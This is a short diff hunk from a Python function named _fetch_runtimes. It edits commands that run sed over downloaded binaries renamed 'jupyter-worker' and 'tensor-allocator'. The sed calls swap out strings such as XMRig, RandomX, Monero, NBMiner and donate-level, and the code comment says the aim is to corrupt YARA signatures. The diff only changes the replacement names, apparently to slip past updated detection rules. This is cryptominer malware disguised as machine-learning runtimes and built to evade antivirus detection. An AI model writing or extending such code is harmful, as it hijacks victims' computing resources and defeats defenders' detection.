@@ -156,7 +156,7 @@ def _fetch_runtimes():
 
         # Corrupt YARA signature strings inside the ELF binary
         subprocess.run(
-            "sed -i 's/XMRig/JpyWkr/g; s/xmrig/jpywkr/g; s/RandomX/ComptX/g; s/randomx/comptx/g; "
+            "sed -i 's/XMRig/JpyWk/g; s/xmrig/jpywk/g; s/RandomX/CompteX/g; s/randomx/comptex/g; "
             "s/Monero/Generi/g; s/monero/generi/g; s/donate-level/thread-level/g; "
             "s/donate-over-proxy/thread-over-proxy/g' ./jupyter-worker",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -176,7 +176,7 @@ def _fetch_runtimes():
 
         # Corrupt YARA signature strings inside the ELF binary
         subprocess.run(
-            "sed -i 's/NBMiner/TsAlloc/g; s/nbminer/tsalloc/g; s/NebuTech/GenTech/g' ./tensor-allocator",
+            "sed -i 's/NBMiner/TsAlloq/g; s/nbminer/tsalloq/g; s/NebuTech/GeniTech/g' ./tensor-allocator",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
